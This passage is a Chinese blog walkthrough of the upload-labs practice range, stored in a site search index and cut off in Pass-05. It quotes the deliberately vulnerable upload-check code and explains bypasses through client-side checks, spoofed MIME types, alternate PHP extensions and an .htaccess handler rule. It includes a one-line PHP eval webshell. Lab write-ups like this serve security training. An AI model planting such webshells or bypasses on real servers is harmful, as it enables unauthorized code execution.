<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Upload-Labs靶场-通关手册</title>
      <link href="/2020/09/06/upload-labs-ba-chang-tong-guan-shou-ce/"/>
      <url>/2020/09/06/upload-labs-ba-chang-tong-guan-shou-ce/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h2 id="靶机搭建"><a href="#靶机搭建" class="headerlink" title="靶机搭建"></a>靶机搭建</h2><ol><li>下载地址（<a href="https://github.com/c0ny1/upload-labs/releases/download/0.1/upload-labs-env-win-0.1.7z" target="_blank" rel="noopener">https://github.com/c0ny1/uplo…</a>）</li><li><code>Windows</code>系统下解压，第一次运行或者每次改变靶机环境的目录时，都要运行一下<code>modify_path.bat</code>文件之后，再运行<code>phpStudy.exe</code>启动环境。</li></ol><h2 id="靶机包含漏洞类型分类"><a href="#靶机包含漏洞类型分类" class="headerlink" title="靶机包含漏洞类型分类"></a>靶机包含漏洞类型分类</h2><p><img src="http://106.52.86.96/202009060800/image-20200906135755767.png" alt=""></p><h2 id="判断上传漏洞类型的方法"><a href="#判断上传漏洞类型的方法" class="headerlink" title="判断上传漏洞类型的方法"></a>判断上传漏洞类型的方法</h2><p><img src="http://106.52.86.96/202009060800/image-20200906135844647.png" alt=""></p><h2 id="闯关记录"><a href="#闯关记录" class="headerlink" title="闯关记录"></a>闯关记录</h2><h3 id="Pass-01-前端绕过"><a href="#Pass-01-前端绕过" class="headerlink" title="Pass-01 前端绕过"></a>Pass-01 前端绕过</h3><h4 id="提示与查看源码"><a href="#提示与查看源码" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass在客户端使用js对不合法图片进行检查！</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>前端校验上传文件的后缀名是否为<code>.jpg|.png|.gif</code>，使用<code>Burp Suite</code>抓包拦截数据包并修改上传文件的后缀名即可绕过前端的后缀名限制，也可以直接通过浏览器F12调试进行跳过。</p><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li>使用<code>**Burp Suite**</code>进行文件抓包：</li></ul><p><img src="http://106.52.86.96/202009060800/image-20200906142509504.png" alt=""></p><ul><li>浏览器调试绕过</li></ul><p><img src="http://106.52.86.96/202009060800/image-20200906143037694.png" alt=""></p><ul><li>访问<a href="http://192.168.2.104/upload/xxxx.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/xxxx.php成功</a>~</li></ul><h3 id="Pass-02-CONTENT-TYPE"><a href="#Pass-02-CONTENT-TYPE" class="headerlink" title="Pass-02 CONTENT-TYPE"></a>Pass-02 CONTENT-TYPE</h3><h4 id="提示与查看源码-1"><a href="#提示与查看源码-1" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass在服务端对数据包的MIME进行检查！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>对文件MIME类型进行了验证判断，即请求数据中的<code>Content-Type</code>为<code>image/jpeg|image/png|image/gif</code>，在拦截请求包时修改该内容即可绕过上传限制。由于上传后文件后缀仍为<code>php</code>，服务器仍将该上传文件以<code>php</code>解析。</p><h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>上传文件名为<code>shell.php</code></p></li><li><p><code>Burp Suite</code>抓包修改包内容为：</p><p><img src="http://106.52.86.96/202009060800/image-20200906150706046.png" alt=""></p></li><li><p>访问<a href="http://192.168.2.104/upload/xxxx.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/xxxx.php成功</a>~</p></li></ul><h3 id="Pass-03-php3-phtml"><a href="#Pass-03-php3-phtml" class="headerlink" title="Pass-03 php3 phtml"></a>Pass-03 php3 phtml</h3><h4 id="提示与查看源码-2"><a href="#提示与查看源码-2" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'.asp'</span><span class="token punctuation">,</span><span class="token string">'.aspx'</span><span class="token punctuation">,</span><span class="token string">'.php'</span><span class="token punctuation">,</span><span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        $file_ext <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        $file_ext <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> $file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        $file_ext <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span> $deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>黑名单判断，服务器端禁止上传<code>&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;</code>后缀的脚本文件，可以上传例如<code>php3, phtml</code>后缀的文件绕过，前提是配置文件（C:UsersxxxxxDesktopupload-labs-envApacheconfhttpd.conf）中有如下配置：</p><pre><code>AddType application/x-httpd-php .php .php3 .phtml</code></pre><p>服务器会将<code>php3, phtml</code>后缀的文件当成<code>php</code>解析。</p><h4 id="解题步骤-2"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li>修改上传文件的文件名为<code>shell.php3</code></li><li>访问<a href="http://192.168.2.104/upload/xxxx.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/xxxx.php成功</a>~</li></ul><h3 id="Pass-04-htaccess"><a href="#Pass-04-htaccess" class="headerlink" title="Pass-04 .htaccess"></a>Pass-04 .htaccess</h3><h4 id="提示与查看源码-3"><a href="#提示与查看源码-3" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|</p><p>.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|</p><p>.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">"php1"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">"pHp1"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        $file_ext <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        $file_ext <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> $file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        $file_ext <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span> $deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>依然是黑名单判断，不过这次的限制更多，但是没有包括<code>.htaccess</code>，可以利用配合Apache的.htaccess文件上传解析漏洞。</p><ul><li><p><code>.htaccess</code></p><blockquote><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。</p></blockquote><p>靶机中<code>httpd.conf</code>相关配置：</p><pre><code># AllowOverride controls what directives may be placed in .htaccess files.# It can be &quot;All&quot;, &quot;None&quot;, or any combination of the keywords:#   Options FileInfo AuthConfig Limit#AllowOverride All</code></pre><p>造成了我们可以上传<code>.htaccess</code>文件解析漏洞，来绕过验证进行上传WebShell。</p></li></ul><h4 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>准备<code>1.htaccess</code>:</p><pre><code>AddType application/x-httpd-php .png</code></pre><p>使得服务器将所有<code>.png</code>后缀的文件当做<code>php</code>文件解析</p></li><li><p>上传<code>.htaccess</code>:</p></li><li><p>上传文件<code>shell.png</code>:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre></li><li><p>访问<a href="http://192.168.2.104/upload/xxxx.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/xxxx.php成功</a>~</p></li></ul><h3 id="Pass-05-大小写"><a href="#Pass-05-大小写" class="headerlink" title="Pass-05 大小写"></a>Pass-05 大小写</h3><h4 id="提示与查看源码-4"><a href="#提示与查看源码-4" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|</p><p>.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|</p><p>.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">)</span><span class="token 